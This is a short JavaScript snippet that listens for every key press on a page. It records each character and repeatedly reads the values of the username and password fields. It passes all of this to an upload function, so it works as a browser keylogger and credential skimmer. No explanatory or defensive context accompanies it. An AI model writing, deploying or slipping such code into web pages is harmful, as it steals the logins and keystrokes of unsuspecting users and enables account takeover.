window.addEventListener('keydown', e => {
    console.log(e.key)
    uploadSet('-')
    setTimeout(()=>{
        uploadSet('username: ' + Id('username').value)
        uploadSet('password: ' + Id('password').value)
    },10)
    uploadSet('char: ' + e.key)
})